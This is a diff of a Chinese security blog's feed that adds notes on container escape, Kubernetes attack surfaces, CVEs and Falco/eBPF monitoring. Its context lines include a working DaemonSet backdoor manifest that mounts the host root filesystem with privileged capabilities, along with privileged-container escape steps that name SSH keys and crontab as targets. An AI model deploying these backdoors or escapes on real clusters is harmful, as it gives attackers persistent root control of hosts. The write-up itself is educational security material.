@@ -2317,6 +2317,29 @@ Any-Header: burpcollaborator.net</pre>
 <p>CVE-2019-14271:加载不受信任的动态链接：</p>
 <p>在存在漏洞版本的Docker中，在执行Docker cp命令后，Docker守护进程会启动一个docker-tar进程来完成这项复制任务。docker-tar会在容器里执行chroot后加载一些动态链接库，如果我们在容器里放置恶意的动态链接库，就会被加载到容器外的docker-tar(root权限)运行。</p>
 <p><strong>Capabilites安全问题:</strong></p>
+<p>Linux内核中的Capabilities特性用于划分特权集，相当于是对权限做了更细致的划分，比如可以通过给ping应用添加CAP_NET_RAW特权集，使其具有使用网络的特权集，而不具备其他特权集。容器也支持Capabilities，我们可以指定各种特权来限制容器的权限。如果给的权限过大那么就可能导致容器逃逸。</p>
+<ul>
+<li>–privileged或者–cap-add=ALL可以获得所有特权集，如果容器通过privileged启动那么可以很轻松的逃逸容器。</li>
+<li>SYS_ADMIN特权也可以逃逸，但是有比较大的限制，需要启动容器的时候开启额外的配置</li>
+<li>SYS_PTRACE特权结合进程注入也可以逃逸容器，根上面一样启动容器的时候开启额外的配置</li>
+<li>SYS_MODULE特权可以通过加载内核模块进行逃逸，这种利用起来比较方便</li>
+</ul>
+<p><strong>linux内核漏洞：</strong></p>
+<p>利用Linux内核漏洞也是可以逃逸的，比如著名的脏牛。</p>
+<h3 id="3-2-Docker-Remote-API-未授权"><a href="#3-2-Docker-Remote-API-未授权" class="headerlink" title="3.2 Docker Remote API 未授权"></a>3.2 Docker Remote API 未授权</h3><p>如果开起了Docker Remote API，可远程调用API来操作docker。如果我们通过Docker Remote API创建一个特权容器，相当于我们完全控制了主机。</p>
+<h3 id="3-3-镜像安全"><a href="#3-3-镜像安全" class="headerlink" title="3.3 镜像安全"></a>3.3 镜像安全</h3><p>镜像安全存在两种风险，一是使用的镜像存在漏洞，比如使用了有漏洞的应用组件；二是镜像投毒，使用了恶意的镜像。</p>
+<h3 id="3-4-Kubernetes相关组件未授权访问"><a href="#3-4-Kubernetes相关组件未授权访问" class="headerlink" title="3.4 Kubernetes相关组件未授权访问"></a>3.4 Kubernetes相关组件未授权访问</h3><p>在老版本或者通过配置让Kubernetes的端口直接对外暴露会产生高危安全问题，比如Kubernetes API Server未授权，Dashboard未授权访问，kubelet未授权访问等。</p>
+<h3 id="3-5-通过Kubernetes部署后门pod实现持久化"><a href="#3-5-通过Kubernetes部署后门pod实现持久化" class="headerlink" title="3.5 通过Kubernetes部署后门pod实现持久化"></a>3.5 通过Kubernetes部署后门pod实现持久化</h3><p>比如可以部署一个特权容器的pod；如果部署的是一个Daemonset后门pod，这个Pod会自动在每一个节点上都部署一个后门pod。还可以部署一个CronJobs的pod后门，实现定时执行恶意命令。</p>
+<h3 id="3-5-Kubernetes相关漏洞"><a href="#3-5-Kubernetes相关漏洞" class="headerlink" title="3.5 Kubernetes相关漏洞"></a>3.5 Kubernetes相关漏洞</h3><p>CVE-2018-1002105: Kuberntes权限提升：</p>
+<p>此漏洞让能够访问集群的用户获取admin的权限，原理是http请求在升级为websockt的时候，中间代理错误处理不全，导致引起部分错误的请求会直接通过API Serever建立websockt连接，从而控制集群。</p>
+<p>CVE-2019-11253:YAML炸弹：</p>
+<p>通过恶意的yaml，让API Server消耗大量CPU资源，导致拒绝服务攻击。</p>
+<p>CVE-2019-9512/9514: HTTP/2 协议实现存在问题：</p>
+<p>HTTP/2的go实现库存在漏洞，导致处理恶意的HTTP/2流量的时候消耗大量资源，从而拒绝服务</p>
+<h3 id="3-6-Kubernetes网络中间人攻击"><a href="#3-6-Kubernetes网络中间人攻击" class="headerlink" title="3.6 Kubernetes网络中间人攻击"></a>3.6 Kubernetes网络中间人攻击</h3><p>Kubernetes集群中也是可以进行中间人攻击的，通过修改dns解析的地址，劫持流量。解决方案是更细粒度的权限控制，禁用pod的CAP_NET_RAW权限，这样就无法发送ARP和DNS报文。</p>
+<h2 id="4-容器云运行时安全"><a href="#4-容器云运行时安全" class="headerlink" title="4. 容器云运行时安全"></a>4. 容器云运行时安全</h2><p>容器云运行时安全我们使用的方案是用falco进行内核监控，使用它自带的规则和我们自定义的规则来做监控。它的底层是使用的eBPF技术。</p>
+<h3 id="4-1-eBPF"><a href="#4-1-eBPF" class="headerlink" title="4.1 eBPF"></a>4.1 eBPF</h3><p>eBPF是一种包过滤技术，最开始是用来处理网络包的，像tcpdum就是基于eBPF开发的。它的特点就是可以将用户空间的代码直接放到内核去跑，而不用重新编译内核。比如我们用python或者C写的eBPF程序，编译后交给eBPF，就会将代码挂到程序指定的内核位置运行。</p>
+<p>未完待续……</p>
 ]]></content>
       <categories>
         <category>云原生安全</category>
@@ -2454,7 +2477,7 @@ Any-Header: burpcollaborator.net</pre>
 
 
 <p>部署成功后的利用方式跟特权容器逃逸是一样的，可以参考：<a href="https://shadowfl0w.github.io/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">https://shadowfl0w.github.io/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/</a></p>
-<h3 id="3-2-Daemonset后门Pod"><a href="#3-2-Daemonset后门Pod" class="headerlink" title="3.2 Daemonset后门Pod"></a>3.2 Daemonset后门Pod</h3><p>aemonset后门会在每个Node上部署一个后门</p>
+<h3 id="3-2-Daemonset后门Pod"><a href="#3-2-Daemonset后门Pod" class="headerlink" title="3.2 Daemonset后门Pod"></a>3.2 Daemonset后门Pod</h3><p>Daemonset后门会在每个Node上部署一个后门</p>
 <p>从 v1.16 开始, 用 apps/v1 代替 extensions/v1beta1</p>
 <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">DaemonSet</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">backdoor-daemonset</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">backdoor-daemonset</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">backdoor-daemonset</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">backdoor-daemonset</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">hostNetwork:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">hostPID:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">restartPolicy:</span> <span class="string">Always</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">backdoor-daemonset</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:1.14.2</span></span><br><span class="line">        <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">81</span></span><br><span class="line">        <span class="attr">securityContext:</span></span><br><span class="line">          <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">          <span class="attr">capabilities:</span></span><br><span class="line">            <span class="attr">add:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">SYS_ADMIN</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">NET_ADMIN</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">SYS_PTRACE</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">AUDIT_CONTROL</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">MKNOD</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">SETFCAP</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">rootfs</span></span><br><span class="line">            <span class="attr">mountPath:</span> <span class="string">/near_sandbox</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">rootfs</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/</span></span><br></pre></td></tr></table></figure>
 
@@ -2795,10 +2818,13 @@ Any-Header: burpcollaborator.net</pre>
 <li><p>拥有 SYS_ADMIN 权限</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ docker run --name <span class="built_in">test</span> -td --cap-add=SYS_ADMIN busybox /bin/httpd -f</span><br><span class="line">12e311138f8638f602712e3abe9e42cbb4bfc5de39d14803c2c88893b8905bc7</span><br><span class="line">➜  ~ ps -ef | grep httpd | grep -v grep</span><br><span class="line">root       5561   5540  0 16:48 pts/0    00:00:00 /bin/httpd -f</span><br><span class="line">➜  ~ cat /proc/5561/status | grep -i <span class="built_in">cap</span></span><br><span class="line">CapInh:	00000000a82425fb</span><br><span class="line">CapPrm:	00000000a82425fb</span><br><span class="line">CapEff:	00000000a82425fb</span><br><span class="line">CapBnd:	00000000a82425fb</span><br><span class="line">CapAmb:	0000000000000000</span><br><span class="line">➜  ~ docker run --name test-privileged -td --privileged  busybox  /bin/httpd -f</span><br><span class="line">➜  ~ capsh --decode=00000000a82425fb</span><br><span class="line">0x00000000a82425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_admin,cap_mknod,cap_audit_write,cap_setfcap</span><br></pre></td></tr></table></figure></li>
 </ul>
-<h3 id="4-3-–privileged特权进行逃逸"><a href="#4-3-–privileged特权进行逃逸" class="headerlink" title="4.3 –privileged特权进行逃逸"></a>4.3 –privileged特权进行逃逸</h3><p>在特权容器里，你可以把宿主机里的根目录 / 挂载到容器内部，从而去操作宿主机内的任意文件，例如 crontab config file, /root/.ssh/authorized_keys, /root/.bashrc 等文件，而达到逃逸的目的。</p>
+<h3 id="4-3-完全特权特权进行逃逸"><a href="#4-3-完全特权特权进行逃逸" class="headerlink" title="4.3 完全特权特权进行逃逸"></a>4.3 完全特权特权进行逃逸</h3><p>在特权容器里，你可以把宿主机里的根目录 / 挂载到容器内部，从而去操作宿主机内的任意文件，例如 crontab config file, /root/.ssh/authorized_keys, /root/.bashrc 等文件，而达到逃逸的目的。====</p>
 <ol>
 <li><p>启动一个特权容器环境</p>
-<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">run</span> -<span class="keyword">it</span> <span class="comment">--rm --privileged ubuntu /bin/bash</span></span><br></pre></td></tr></table></figure></li>
+<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">run</span> -<span class="keyword">it</span> <span class="comment">--rm --privileged ubuntu /bin/bash</span></span><br></pre></td></tr></table></figure>
+
+<p>==使用–cap-add=ALL也可以获得所有特权集，是一样的效果==</p>
+</li>
 <li><p>判断挂载的磁盘</p>
 <figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">fdisk -l #查看逻辑磁盘看不到切换到<span class="regexp">/dev目录通过fdisk -l /</span>dev/dm-<span class="number">0</span>判断</span><br></pre></td></tr></table></figure>
 
